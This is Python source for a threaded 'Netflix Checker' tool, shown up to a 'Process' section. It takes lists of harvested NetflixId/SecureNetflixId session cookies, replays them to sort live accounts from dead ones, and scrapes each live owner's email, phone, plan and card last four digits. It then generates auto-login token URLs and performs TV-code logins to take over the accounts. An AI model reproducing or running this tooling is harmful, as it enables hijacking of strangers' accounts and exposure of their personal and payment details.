from curl_cffi import requests
import re
import os
import sys
import json
import ctypes
import threading
import time
from urllib.parse import unquote
from html import unescape
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

# Force UTF-8 output on Windows to avoid encoding errors with emoji/unicode
if sys.platform == 'win32':
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

init(autoreset=True)

REQUEST_TIMEOUT = (5, 12)  # connect, read
DEFAULT_WORKERS = None

# Thread-local session with connection pooling to speed up repeated requests.
thread_local = threading.local()


def _default_workers():
    """Decide thread count with env override."""
    try:
        env_workers = int(os.getenv("NETFLIX_THREADS", "0"))
        if env_workers > 0:
            return env_workers
    except ValueError:
        pass
    return min(32, max(4, (os.cpu_count() or 4) * 2))


DEFAULT_WORKERS = _default_workers()


def _create_session():
    # curl_cffi Session supports impersonate UA; HTTP/2 is enabled automatically for HTTPS.
    session = requests.Session(impersonate="chrome110")
    session.headers.update({"User-Agent": "Mozilla/5.0"})
    return session


def get_session():
    # LUÔN LUÔN tạo 1 phiên (Session) hoàn toàn mới cho mỗi Cookie.
    # Không dùng thread_local cache vì ThreadPool mượn lại Thread cũ, 
    # sẽ mang theo Cookie Netflix đã ghim ở acc trước đó lây sang acc sau!
    return _create_session()

# ══════════════════════════════════════════════════════════════════════
#  Global Statistics & Locks
# ══════════════════════════════════════════════════════════════════════

class Stats:
    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.live = 0
        self.dead = 0
        self.error = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.file_lock = threading.Lock()
        self.results_file = ""
        self.netscape_file = ""

    def update_title(self):
        while self.checked < self.total:
            elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start_time))
            title = (f"Netflix Checker - Checked: {self.checked}/{self.total} | "
                     f"Live: {self.live} | Dead: {self.dead} | "
                     f"Time: {elapsed}")
            ctypes.windll.kernel32.SetConsoleTitleW(title)
            time.sleep(0.5)

    def increment_checked(self):
        with self.lock:
            self.checked += 1

    def increment_live(self):
        with self.lock:
            self.live += 1

    def increment_dead(self):
        with self.lock:
            self.dead += 1

    def increment_error(self):
        with self.lock:
            self.error += 1

# ══════════════════════════════════════════════════════════════════════
#  Currency Map
# ══════════════════════════════════════════════════════════════════════

CURRENCY_MAP = {
    "US": "$", "GB": "£", "IN": "₹", "CA": "C$", "AU": "A$", "BR": "R$",
    "MX": "Mex$", "TR": "₺", "ES": "€", "FR": "€", "DE": "€", "IT": "€",
    "NL": "€", "PL": "zł", "AR": "ARS$", "CO": "COP$", "CL": "CLP$",
    "PE": "S/", "JP": "¥", "KR": "₩", "TW": "NT$", "ZA": "R", "NG": "₦",
    "KE": "KSh", "EG": "E£", "SA": "SAR", "AE": "AED", "PK": "Rs",
    "ID": "Rp", "MY": "RM", "PH": "₱", "VN": "₫", "TH": "฿", "SG": "S$",
    "NZ": "NZ$", "HK": "HK$", "CH": "CHF", "SE": "kr", "NO": "kr",
    "DK": "kr", "RU": "₽", "UA": "₴", "CZ": "Kč", "HU": "Ft", "RO": "lei",
    "PT": "€", "IE": "€", "BE": "€", "AT": "€", "FI": "€", "GR": "€"
}

# ══════════════════════════════════════════════════════════════════════
#  Account Info Parser
# ══════════════════════════════════════════════════════════════════════

def decode_response(raw_html):
    html = unescape(raw_html)
    # Netflix uses \xXX sequences in inline JS; decode them to actual characters
    html = _fix_js_escapes(html)
    return html


def _fix_js_escapes(text):
    r"""Convert JS \xXX and \uXXXX escape sequences to actual characters."""
    # Replace \xXX (JS hex escape) with the actual character
    def _hex_replace(m):
        try:
            return chr(int(m.group(1), 16))
        except Exception:
            return m.group(0)
    text = re.sub(r'\\x([0-9a-fA-F]{2})', _hex_replace, text)
    # Also handle \uXXXX
    def _unicode_replace(m):
        try:
            return chr(int(m.group(1), 16))
        except Exception:
            return m.group(0)
    text = re.sub(r'\\u([0-9a-fA-F]{4})', _unicode_replace, text)
    return text


def _prepare_json_text(text):
    r"""Prepare a JSON-like string from Netflix JS by converting \xXX to \u00XX."""
    # JSON doesn't support \xXX, only \uXXXX, so convert
    text = re.sub(r'\\x([0-9a-fA-F]{2})', r'\\u00\1', text)
    return text


def _extract_json_obj(text, key):
    """Best-effort extract a JSON object whose key marker appears in text."""
    idx = text.find(key)
    if idx == -1:
        return None
    start = text.find("{", idx)
    if start == -1:
        return None
    depth = 0
    for i in range(start, min(len(text), start + 200000)):
        ch = text[i]
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                raw = text[start:i + 1]
                # First try as-is
                try:
                    return json.loads(raw)
                except Exception:
                    pass
                # Convert \xXX to \u00XX and retry
                try:
                    fixed = _prepare_json_text(raw)
                    return json.loads(fixed)
                except Exception:
                    return None
    return None


def _clean_val(val):
    r"""Decode \xXX / \uXXXX escape sequences if present; otherwise return original."""
    if not isinstance(val, str):
        return val
    # Check for JS-style escapes (actual backslash + x/u in the string)
    if '\\x' in val or '\\u' in val:
        try:
            val = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), val)
            val = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), val)
        except Exception:
            pass
    return val


def _find_authurl(decoded_html):
    """Robust search for authURL anywhere in decoded HTML/JS."""
    patterns = [
        r'"authURL"\s*:\s*"([^"]+)"',
        r'authURL\\":\\"([^"\\]+)\\"',
        r'authURL\s*=\s*"([^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, decoded_html)
        if m:
            return _clean_val(m.group(1))
    return "-"


def _parse_cookie_input(raw):
    """Try to extract NetflixId, SecureNetflixId, nfvdid from a raw or encoded/Netscape string."""
    decoded = unquote(raw.strip())
    netflix_id = None
    secure_id = None
    nfvdid = None

    # First, try standard key=value format
    m = re.search(r'NetflixId=([^;\s]+)', decoded)
    if m: netflix_id = m.group(1)
    m = re.search(r'SecureNetflixId=([^;\s]+)', decoded)
    if m: secure_id = m.group(1)
    m = re.search(r'nfvdid=([^;\s]+)', decoded)
    if m: nfvdid = m.group(1)

    # Next, try Netscape HTTP Cookie File format (tab/space separated)
    if not netflix_id:
        m = re.search(r'NetflixId[\t ]+([^\s;]+)', decoded)
        if m: netflix_id = m.group(1)
    if not secure_id:
        m = re.search(r'SecureNetflixId[\t ]+([^\s;]+)', decoded)
        if m: secure_id = m.group(1)
    if not nfvdid:
        m = re.search(r'nfvdid[\t ]+([^\s;]+)', decoded)
        if m: nfvdid = m.group(1)

    # Finally, try pipe-separated format (e.g. NetflixIdValue|SecureNetflixIdValue)
    if not netflix_id:
        parts = decoded.split("|")
        # Ensure we don't accidentally split a large unparsed chunk
        if len(parts) > 0 and '\t' not in parts[0] and '=' not in parts[0]:
            netflix_id = parts[0].strip()
        if len(parts) > 1 and not secure_id:
            secure_id = parts[1].strip()

    extras = {}
    if nfvdid:
        extras["nfvdid"] = nfvdid
        
    with open('debug_cookies.txt', 'a', encoding='utf-8') as f:
        f.write(f"RAW LEN: {len(raw)} | N_ID: {netflix_id[:15] if netflix_id else 'None'} | S_ID: {secure_id[:15] if secure_id else 'None'}\n")
        
    return netflix_id, secure_id, extras


def _extract_all_json_blobs(html):
    """Extract all JSON objects found inside <script> tags."""
    blobs = []
    for m in re.finditer(r'<script[^>]*>(.*?)</script>', html, re.DOTALL):
        script = m.group(1).strip()
        if not script or len(script) < 30:
            continue
        # Try to find JSON assignment:  varName = {...};
        for assign in re.finditer(r'(?:var\s+\w+|window\.\w+|\w+)\s*=\s*(\{.+)', script, re.DOTALL):
            txt = assign.group(1)
            depth = 0
            for i, ch in enumerate(txt):
                if ch == '{':
                    depth += 1
                elif ch == '}':
                    depth -= 1
                    if depth == 0:
                        try:
                            obj = json.loads(txt[:i + 1])
                            blobs.append(obj)
                        except Exception:
                            pass
                        break
        # Also try the whole script as JSON
        if script.startswith('{'):
            try:
                blobs.append(json.loads(script))
            except Exception:
                pass
    return blobs


def _deep_search(obj, keys, results=None, depth=0):
    """Recursively search a nested dict/list for keys, collecting their values."""
    if results is None:
        results = {}
    if depth > 15:
        return results
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in keys and v and k not in results:
                results[k] = v
            if isinstance(v, (dict, list)):
                _deep_search(v, keys, results, depth + 1)
    elif isinstance(obj, list):
        for item in obj:
            if isinstance(item, (dict, list)):
                _deep_search(item, keys, results, depth + 1)
    return results


def parse_account_info(decoded_html):
    result = {
        "status": "LIVE",
        "plan": "-", "price": "-", "billing": "-", "videoQuality": "-",
        "maxStreams": "-", "paymentType": "-", "last4": "-",
        "memberSince": "-",
        "country": "-", "owner": "-", "email": "-",
        "phone": "-", "experience": "-", "membershipStatus": "-",
        "profiles": "-", "numProfiles": 0, "numKidsProfiles": 0, "extraMembers": False,
        "authURL": "-"
    }

    # ═══════════════════════════════════════
    #  Method 1: Old-style fieldType patterns
    # ═══════════════════════════════════════
    plan_match = re.search(
        r'"currentPlan":\{"fieldType":"Group","fieldGroup":"MemberPlan","fields":\{"localizedPlanName":\{"fieldType":"String","value":"(.*?)"\}',
        decoded_html)
    if plan_match:
        result["plan"] = _clean_val(plan_match.group(1))

    price_match = re.search(r'"localizedPrice":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if price_match:
        result["price"] = _clean_val(price_match.group(1))
    if result["price"] == "-":
        # planPrice is used in some layouts
        pp = re.search(r'"planPrice":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
        if pp:
            result["price"] = _clean_val(pp.group(1))

    billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if billing_match:
        result["billing"] = _clean_val(billing_match.group(1))

    # memberSince: can be ISO date, Unix timestamp, or text
    member_since_match = re.search(
        r'"memberSince"\s*:\s*"(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d+Z)"', decoded_html)
    if member_since_match:
        iso_date_str = member_since_match.group(1)
        dt = datetime.strptime(iso_date_str, "%Y-%m-%dT%H:%M:%S.%fZ")
        result["memberSince"] = f"{dt.day} {dt.strftime('%B %Y')}"

    if result["memberSince"] == "-":
        # Try Unix timestamp in ms: "memberSince":{"fieldType":"Numeric","value":1762451955000}
        ts_match = re.search(r'"memberSince"\s*:\s*\{"fieldType"\s*:\s*"Numeric"\s*,\s*"value"\s*:\s*(\d{10,})\s*\}', decoded_html)
        if ts_match:
            try:
                ts = int(ts_match.group(1)) / 1000.0
                dt = datetime.fromtimestamp(ts)
                result["memberSince"] = f"{dt.day} {dt.strftime('%B %Y')}"
            except Exception:
                pass

    if result["memberSince"] == "-":
        # Try plain text: "memberSince":"November 2025"
        txt_match = re.search(r'"memberSince"\s*:\s*"([A-Z][a-z]+\s+\d{4})"', decoded_html)
        if txt_match:
            result["memberSince"] = _clean_val(txt_match.group(1))

    quality = re.search(r'"videoQuality":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if quality:
        result["videoQuality"] = _clean_val(quality.group(1))

    stream = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', decoded_html)
    if stream:
        result["maxStreams"] = stream.group(1)

    pay_type = re.search(r'"type":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if pay_type:
        result["paymentType"] = _clean_val(pay_type.group(1))

    last4 = re.search(r'"displayText":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if last4:
        result["last4"] = _clean_val(last4.group(1))

    # ═══════════════════════════════════════
    #  Method 2: userInfo blob only
    # ═══════════════════════════════════════
    user_obj = _extract_json_obj(decoded_html, '"userInfo"')
    if user_obj and isinstance(user_obj, dict):
        result["authURL"] = _clean_val(user_obj.get("authURL", result["authURL"]))
        if user_obj.get("memberSince"):
            result["memberSince"] = _clean_val(user_obj["memberSince"])
        if user_obj.get("currentCountry"):
            result["country"] = _clean_val(user_obj["currentCountry"])
        if user_obj.get("emailAddress"):
            result["email"] = _clean_val(user_obj["emailAddress"])
        if user_obj.get("membershipStatus"):
            result["membershipStatus"] = _clean_val(user_obj["membershipStatus"])
        # Extract numKidsProfiles
        if user_obj.get("numKidsProfiles"):
            try:
                result["numKidsProfiles"] = int(user_obj["numKidsProfiles"])
            except (ValueError, TypeError):
                pass
        # Extract owner name from userInfo
        if result["owner"] == "-":
            owner_name = (user_obj.get("accountOwnerName") or
                         user_obj.get("name") or
                         user_obj.get("displayName"))
            if owner_name:
                result["owner"] = _clean_val(owner_name)

    # ═══════════════════════════════════════
    #  Method 3: Deep search all JSON in <script> blocks (Sapphire UI)
    # ═══════════════════════════════════════
    wanted_keys = {
        "authURL", "emailAddress", "memberEmail", "userEmail",
        "profileName", "firstName", "displayName", "nameFirst",
        "localizedPlanName", "currentCountry", "countryOfSignup",
        "membershipStatus", "phoneNumber", "formattedPhoneNumber",
        "maxStreams", "extraMemberEnabled", "numProfiles",
    }
    need_fill = (result["email"] == "-" or result["owner"] == "-" or
                 result["phone"] == "-" or result["profiles"] == "-" or
                 result["authURL"] == "-")
    if need_fill:
        try:
            blobs = _extract_all_json_blobs(decoded_html)
            found = {}
            for blob in blobs:
                _deep_search(blob, wanted_keys, found)
            # Apply found values
            if result["email"] == "-":
                result["email"] = _clean_val(
                    found.get("emailAddress") or found.get("memberEmail") or
                    found.get("userEmail") or "-"
                )
            if result["owner"] == "-":
                result["owner"] = _clean_val(
                    found.get("displayName") or found.get("firstName") or
                    found.get("nameFirst") or "-"
                )
            if result["phone"] == "-":
                result["phone"] = _clean_val(
                    found.get("phoneNumber") or found.get("formattedPhoneNumber") or "-"
                )
            if result["authURL"] == "-" and found.get("authURL"):
                result["authURL"] = _clean_val(found["authURL"])
            if result["country"] == "-" and found.get("currentCountry"):
                result["country"] = _clean_val(found["currentCountry"])
            if found.get("membershipStatus") and result["membershipStatus"] == "-":
                result["membershipStatus"] = _clean_val(found["membershipStatus"])
            if found.get("profileName") and result["profiles"] == "-":
                pn = found["profileName"]
                if isinstance(pn, list):
                    result["profiles"] = ", ".join(_clean_val(p) for p in pn)
                else:
                    result["profiles"] = _clean_val(pn)
            if found.get("numProfiles") and result["numProfiles"] == 0:
                try:
                    result["numProfiles"] = int(found["numProfiles"])
                except (ValueError, TypeError):
                    pass
        except Exception:
            pass

    # ═══════════════════════════════════════
    #  Method 4: Broad regex fallbacks
    # ═══════════════════════════════════════
    if result["email"] == "-":
        for pat in [
            r'"emailAddress"\s*:\s*"([^"]+@[^"]+)"',
            r'"memberEmail"\s*:\s*"([^"]+@[^"]+)"',
            r'"email"\s*:\s*"([^"@]+@[^"]+)"',
            r'"userEmail"\s*:\s*"([^"]+@[^"]+)"',
            r'"profileEmailAddress"\s*:\s*"([^"]+@[^"]+)"',
            r'data-uia="[^"]*email[^"]*"[^>]*>([^<]+@[^<]+)<',
        ]:
            m = re.search(pat, decoded_html, re.IGNORECASE)
            if m:
                result["email"] = _clean_val(m.group(1).strip())
                break

    if result["owner"] == "-":
        for pat in [
            r'"displayName"\s*:\s*"([^"]{1,60})"',
            r'"firstName"\s*:\s*"([^"]{1,60})"',
            r'"nameFirst"\s*:\s*"([^"]{1,60})"',
            r'"accountOwner"\s*:\s*"([^"]{1,60})"',
        ]:
            m = re.search(pat, decoded_html)
            if m:
                result["owner"] = _clean_val(m.group(1))
                break

    if result["profiles"] == "-":
        profile_names = re.findall(r'"profileName"\s*:\s*"([^"]+)"', decoded_html)
        if profile_names:
            unique_profiles = list(dict.fromkeys(_clean_val(p) for p in profile_names))
            result["profiles"] = ", ".join(unique_profiles)
            if result["numProfiles"] == 0:
                result["numProfiles"] = len(unique_profiles)

    # Final fallback: try to extract numProfiles from HTML if still 0
    if result["numProfiles"] == 0:
        np_match = re.search(r'"numProfiles"\s*:\s*(\d+)', decoded_html)
        if np_match:
            result["numProfiles"] = int(np_match.group(1))
        elif result["profiles"] != "-":
            # Count from the profiles string
            result["numProfiles"] = len([p.strip() for p in result["profiles"].split(",") if p.strip()])

    if result["price"] == "-":
        for pat in [
            r'"localizedPrice"\s*:\s*"([^"]+)"',
            r'"formattedPrice"\s*:\s*"([^"]+)"',
            r'"price"\s*:\s*"([^"]*\d[^"]*)"',
        ]:
            m = re.search(pat, decoded_html)
            if m:
                result["price"] = _clean_val(m.group(1))
                break

    if result["phone"] == "-":
        for pat in [
            r'"phoneNumber"\s*:\s*"([^"]+)"',
            r'"formattedPhoneNumber"\s*:\s*"([^"]+)"',
        ]:
            m = re.search(pat, decoded_html)
            if m:
                result["phone"] = _clean_val(m.group(1))
                break

    if result["country"] == "-":
        for pat in [
            r'"currentCountry"\s*:\s*"([A-Z]{2})"',
            r'"countryOfSignup"\s*:\s*"([A-Z]{2})"',
            r'"country"\s*:\s*"([A-Z]{2})"',
        ]:
            m = re.search(pat, decoded_html)
            if m:
                result["country"] = m.group(1)
                break

    if result["membershipStatus"] == "-":
        m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', decoded_html)
        if m:
            result["membershipStatus"] = _clean_val(m.group(1))

    # Fallback: direct regex for authURL anywhere in page
    if not result.get("authURL") or result["authURL"] == "-":
        result["authURL"] = _find_authurl(decoded_html)

    return result


def fetch_extra_account_info(cookies):
    """Call Netflix internal API to get structured account and profile data."""
    session = get_session()
    extra = {}

    # ── Try the /browse page for numProfiles ──
    try:
        r = session.get(
            "https://www.netflix.com/browse",
            cookies=cookies, allow_redirects=True, timeout=REQUEST_TIMEOUT)
        if r.status_code == 200:
            decoded_browse = decode_response(r.text or "")

            # Extract profile names and derive profiles/numProfiles
            profile_names = re.findall(r'"profileName"\s*:\s*"([^"]+)"', decoded_browse)
            if profile_names:
                unique_profiles = list(dict.fromkeys(_clean_val(p) for p in profile_names))
                extra["profiles"] = ", ".join(unique_profiles)
                extra["numProfiles"] = len(unique_profiles)

            # Extract numProfiles directly if present and keep the larger value
            np_match = re.search(r'"numProfiles"\s*:\s*(\d+)', decoded_browse)
            if np_match:
                parsed_num = int(np_match.group(1))
                extra["numProfiles"] = max(extra.get("numProfiles", 0), parsed_num)
    except Exception:
        pass

    return extra


def _is_login_redirect(url_or_location):
    """Check if a URL/Location header points to a Netflix login page.
    Handles locale prefixes like /vn/login, /fr-en/login etc.
    """
    path = url_or_location.lower()
    # Remove protocol + host
    if "netflix.com" in path:
        idx = path.find("netflix.com")
        path = path[idx + len("netflix.com"):]
    # Strip locale prefix: /xx/ or /xx-yy/
    stripped = re.sub(r'^/[a-z]{2}(-[a-z]{2,4})?/', '/', path)
    # Dead only if it's specifically the /login path
    return stripped.startswith("/login")


def _is_account_page(url_or_location):
    """Check if a URL/Location header points to an account page.
    Handles locale prefixes.
    """
    path = url_or_location.lower()
    if "netflix.com" in path:
        idx = path.find("netflix.com")
        path = path[idx + len("netflix.com"):]
    stripped = re.sub(r'^/[a-z]{2}(-[a-z]{2,4})?/', '/', path)
    return "/account" in stripped or "/youraccount" in stripped


def check_account_info(netflix_id, secure_id=None, extra_cookies=None):
    """Check Netflix cookie.
    allow_redirects=True (works with curl_cffi).
    Check final URL for login redirect → DEAD.
    Check membershipStatus for ANONYMOUS → DEAD.
    """
    url = "https://www.netflix.com/account"
    cookies = {"NetflixId": netflix_id}
    if secure_id:
        cookies["SecureNetflixId"] = secure_id
    if extra_cookies:
        cookies.update(extra_cookies)

    session = get_session()

    try:
        r = session.get(url, cookies=cookies, allow_redirects=True, timeout=REQUEST_TIMEOUT)

        # Collect all cookies from response
        all_cookies = dict(cookies)
        for name, cookie in r.cookies.items():
            all_cookies[name] = getattr(cookie, "value", cookie)

        # DEAD: final URL contains "login" (redirected to login page)
        final_url = r.url.lower()
        if "login" in final_url and "account" not in final_url:
            return {"status": "DEAD"}, all_cookies

        # Parse the page
        decoded = decode_response(r.text or "")
        info = parse_account_info(decoded)

        # Extract nfvdid from page HTML for NFToken generation
        nfvdid_match = re.search(r'"nfvdid"\s*:\s*"([^"]+)"', decoded)
        if nfvdid_match and "nfvdid" not in all_cookies:
            all_cookies["nfvdid"] = nfvdid_match.group(1)
        if "nfvdid" not in all_cookies:
            nfvdid_match2 = re.search(r'nfvdid=([^;\s"]+)', decoded)
            if nfvdid_match2:
                all_cookies["nfvdid"] = nfvdid_match2.group(1)

        # DEAD: account has no active membership
        membership = info.get("membershipStatus", "-")
        if membership in ("ANONYMOUS", "FORMER_MEMBER", "NON_MEMBER", "NEVER_MEMBER"):
            return {"status": "DEAD"}, all_cookies

        return info, all_cookies
    except Exception as e:
        return {"status": "ERROR", "error": str(e)}, {}


# ══════════════════════════════════════════════════════════════════════
#  Country Check from billingActivity
# ══════════════════════════════════════════════════════════════════════

def check_country(netflix_id, secure_id=None):
    url = "https://www.netflix.com/billingActivity"
    cookies = {"NetflixId": netflix_id}
    if secure_id:
        cookies["SecureNetflixId"] = secure_id

    session = get_session()

    try:
        r = session.get(url, cookies=cookies, allow_redirects=False, timeout=REQUEST_TIMEOUT)
        location = r.headers.get("Location", "")

        if "login" in location.lower():
            return "DEAD"

        match = re.search(r'netflix\.com/([a-z]{2})(?:-[a-z]{2})?/billingActivity', location, re.IGNORECASE)
        if match:
            return match.group(1).upper()

        r2 = session.get(url, cookies=cookies, allow_redirects=True, timeout=REQUEST_TIMEOUT)
        match = re.search(r'netflix\.com/([a-z]{2})(?:-[a-z]{2})?/billingActivity', r2.url, re.IGNORECASE)
        if match:
            return match.group(1).upper()

        match = re.search(r'"currentCountry"\s*:\s*"([A-Z]{2})"', r2.text)
        if match:
            return match.group(1)

        match = re.search(r'"country"\s*:\s*"([A-Z]{2})"', r2.text)
        if match:
            return match.group(1)

        return "Unknown"
    except Exception:
        return "Unknown"


# ══════════════════════════════════════════════════════════════════════
#  NFToken Generator
# ══════════════════════════════════════════════════════════════════════

def generate_nftoken(cookie_dict):
    api_url = 'https://android13.prod.ftl.netflix.com/graphql'
    headers = {
        'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
        'Accept': 'multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json',
        'Content-Type': 'application/json',
        'Origin': 'https://www.netflix.com',
        'Referer': 'https://www.netflix.com/'
    }

    required = ['NetflixId', 'SecureNetflixId', 'nfvdid']
    missing = [c for c in required if c not in cookie_dict]
    if missing:
        return None, f"Missing: {', '.join(missing)}"

    cookie_str = '; '.join(f"{k}={v}" for k, v in cookie_dict.items())
    headers['Cookie'] = cookie_str

    payload = {
        "operationName": "CreateAutoLoginToken",
        "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
        "extensions": {
            "persistedQuery": {
                "version": 102,
                "id": "76e97129-f4b5-41a0-a73c-12e674896849"
            }
        }
    }

    session = get_session()

    try:
        r = session.post(api_url, headers=headers, json=payload, timeout=REQUEST_TIMEOUT)
        if r.status_code == 200:
            data = r.json()
            if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
                token_obj = data['data']['createAutoLoginToken']
                # token_obj can be a dict with 'tokenValue' or a plain string
                if isinstance(token_obj, dict):
                    token_str = token_obj.get('tokenValue') or token_obj.get('token') or token_obj.get('nftoken') or str(token_obj)
                else:
                    token_str = str(token_obj)
                return token_str, None
            elif 'errors' in data:
                err_msg = data['errors'][0].get('message', 'Cookie expired') if data['errors'] else 'Cookie expired'
                return None, err_msg
            else:
                return None, "Invalid response"
        else:
            return None, f"HTTP {r.status_code}"
    except Exception as e:
        return None, str(e)





def tv_login_with_code(auth_url, tv_code, cookies):
    """
    Perform TV login flow against https://www.netflix.com/tv8 using a rendezvous code.
    Returns (success_bool, message).
    """
    if not auth_url or not tv_code:
        return False, "Missing authURL or TV_CODE"

    url = "https://www.netflix.com/tv8"
    headers = {
        "host": "www.netflix.com",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://www.netflix.com",
        "priority": "u=0, i",
        "referer": "https://www.netflix.com/tv8",
        "sec-ch-ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Google Chrome\";v=\"144\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-model": "\"\"",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-ch-ua-platform-version": "\"10.0.0\"",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    }

    data = {
        "flow": "websiteSignUp",
        "authURL": auth_url,
        "flowMode": "enterTvLoginRendezvousCode",
        "withFields": "tvLoginRendezvousCode,isTvUrl2",
        "code": tv_code,
        "tvLoginRendezvousCode": tv_code,
        "action": "nextAction",
    }

    session = get_session()
    try:
        # Do NOT follow redirects — 302 to /tv/out/success = success
        r = session.post(url, headers=headers, data=data, cookies=cookies,
                         allow_redirects=False, timeout=REQUEST_TIMEOUT)

        location = r.headers.get("Location", "")

        # SUCCESS: 302 redirect to success page
        if r.status_code in (301, 302) and "/tv/out/success" in location:
            return True, "TV login SUCCESS"

        # FAIL: 302 but not to success
        if r.status_code in (301, 302):
            return False, f"Redirect to: {location}"

        # Status 200 = still on TV8 page = error
        txt = r.text or ""

        # Helper: fully decode error text (JS escapes, HTML entities, HTML tags)
        def _clean_error(raw):
            s = raw
            s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
            s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
            s = unescape(s)
            s = re.sub(r'<[^>]+>', '', s)
            return s.strip()

        # 1) Check JSON errorCode first
        err_code_m = re.search(r'"errorCode"\s*:\s*"([^"]+)"', txt)
        err_msg_m = re.search(r'"errorMessage"\s*:\s*"([^"]+)"', txt)
        if err_code_m:
            code = _clean_error(err_code_m.group(1))
            msg = _clean_error(err_msg_m.group(1)) if err_msg_m else ""
            if msg and ('{errorCode}' in msg or '{' in msg):
                msg = ""
            return False, f"{code}: {msg}" if msg else code

        # 2) Check HTML error messages
        for pat in [
            r'data-uia="UIMessage-content">(.*?)</\s*\w',
            r'class="ui-message-contents"[^>]*>(.*?)</\s*\w',
        ]:
            m = re.search(pat, txt, re.DOTALL)
            if m:
                cleaned = _clean_error(m.group(1))
                if cleaned and '{' not in cleaned:
                    return False, cleaned

        # 200 but no specific error found
        return False, "TV code not accepted or expired"
    except Exception as e:
        return False, str(e)


# ══════════════════════════════════════════════════════════════════════
#  Display Functions
# ══════════════════════════════════════════════════════════════════════

def print_result(i, info, country, token, token_error, tv_login_ok, tv_login_msg, cookie_dict):
    currency = CURRENCY_MAP.get(country, "?")

    if info["status"] == "LIVE":
        num_profiles = info.get('numProfiles', 0)
        profile_list = info.get('profiles', '-')
        first_profile = '-'
        if profile_list not in ('-', ''):
            first_profile = profile_list.split(',')[0].strip()
        membership = info.get('membershipStatus', '-')
        status_display = 'Active \u2705' if membership in ('CURRENT_MEMBER', '-', '') else membership if membership else '?'
        extra_display = 'Yes \u2705' if info.get('extraMembers') else 'No \u274c'

        lines = [
            f"\ud83d\udfe2 STATUS: {status_display}",
            f"\ud83c\udf0d REGION: {country} ({currency})",
            f"\u23f0 MEMBER SINCE: {info['memberSince']}",
            f"\ud83d\udc64 OWNER: {info.get('owner','-')}",
            f"\ud83d\udc51 PLAN: {info['plan']} ({info['videoQuality']})",
            f"\ud83d\udcb0 PRICE: {info.get('price','-')}",
            f"\ud83d\udcb3 PAYMENT: {info['paymentType']} {info['last4']}",
            f"\ud83d\udcc5 NEXT BILLING: {info['billing']}",
            f"\ud83d\udc65 PROFILE: {first_profile}",
            f"\ud83c\udfad PROFILES: {num_profiles}",
            f"\ud83d\udce7 EMAIL: {info.get('email','-')}",
            f"\u260e\ufe0f PHONE: {info.get('phone','-')}",
            f"\ud83d\udc65 EXTRA MEMBERS: {extra_display}",
        ]

        if token:
            lines.append(f"🔗 LOGIN: https://netflix.com/?nftoken={token}")
        elif token_error and not token_error.startswith("Missing:"):
            lines.append(f"🔗 LOGIN: FAILED - {token_error}")


        if tv_login_ok is True:
            lines.append(f"📺 TV CODE FLOW: SUCCESS ({tv_login_msg})")
        elif tv_login_ok is False:
            lines.append(f"📺 TV CODE FLOW: FAILED - {tv_login_msg}")

        max_width = max(len(line) for line in lines)
        box_w = max_width + 4

        print(Fore.GREEN + "┌" + "─" * (box_w - 2) + "┐")

        header = f"🔵 LIVE [{i}] | {country} ({currency})"
        pad = (box_w - 2 - len(header)) // 2
        print(Fore.GREEN + "│" + Style.RESET_ALL + " " * pad + header + " " * (box_w - 2 - len(header) - pad) + Fore.GREEN + "│")

        print(Fore.GREEN + "├" + "─" * (box_w - 2) + "┤")

        for line in lines:
            pad = box_w - 4 - len(line)
            print(Fore.GREEN + "│" + Style.RESET_ALL + " " + line + " " * pad + " " + Fore.GREEN + "│")

        print(Fore.GREEN + "└" + "─" * (box_w - 2) + "┘" + Style.RESET_ALL)

    elif info["status"] == "DEAD":
        print(f"{Fore.RED}❌ [{i}] DEAD COOKIE{Style.RESET_ALL}")

    else:
        print(f"{Fore.YELLOW}⚠️  [{i}] ERROR: {info.get('error', 'Unknown')}{Style.RESET_ALL}")


# ══════════════════════════════════════════════════════════════════════
#  Process
# ══════════════════════════════════════════════════════════════════════

